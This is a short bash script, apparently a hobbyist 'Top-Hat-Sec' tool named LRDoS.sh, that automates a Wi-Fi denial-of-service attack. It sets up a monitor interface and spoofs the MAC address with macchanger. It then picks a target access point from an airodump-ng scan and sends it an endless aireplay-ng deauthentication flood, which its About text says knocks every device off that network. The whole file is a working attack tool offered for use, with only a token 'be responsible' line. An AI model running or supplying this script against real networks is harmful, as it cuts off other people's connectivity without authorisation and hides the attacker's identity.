clear
echo "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
echo "%       Local Router Denial Of Service      %"
echo "%       By: R4V3N747700  - Top-Hat-Sec      %"
echo "%            admin@top-hat-sec.com          %"
echo "%         http://www.top-hat-sec.com        %"
echo "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
echo ""
echo "1. Configure Interface"
echo "2. Configure Target & Attack!"
echo "3. About"
echo ""
echo "Choose Option: "
read menu 

if [ $menu = "1" ]; then
	clear
	airmon-ng
	echo "Type the interface you wish to use: "
	read interface
	airmon-ng start $interface
        echo "Faking MAC"
	sleep 2
	ifconfig mon0 down
	macchanger -r mon0
	ifconfig mon0 up
	./LRDoS.sh
else
if [ $menu = "2" ]; then
	clear
	xterm -T scanning -e airodump-ng mon0 &
	echo "Enter target BSSID: "
	read bssid
	killall airodump-ng
	echo "Preforming Denial of Service"
	xterm -T attacking -e aireplay-ng -0 0 -a $bssid mon0 &
	echo "The attack will last as long as you keep it running.."
	echo ""
	echo "When you wish to stop the attack, please press enter.."
	read enterkey
	killall aireplay-ng
	./LRDoS.sh
else
if [ $menu = "3" ]; then
	clear
	echo "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
	echo "% This tool uses the aircrack-ng suite to send infinite deauth packets        %"
	echo "% to the target Access Point. Since you do not need to authenticate           %"
	echo "% with the AP, you can DoS the network until your IP address is blocked       %"
	echo "% or you decide to stop the attack. As long as the attack is running,         %"
	echo "% all machines and wireless devices will be kicked off of the target network  %"
	echo "%=============================================================================%"
	echo "%Please Be Responsible - R4V3N747700 - admin@top-hat-sec.com                  %"
	echo "==============================================================================="
	echo ""
	echo "Press Enter to continue.."
	read entermenu


else
echo "Invalid Entry.."
sleep 2
./LRDoS.sh
fi
fi
fi
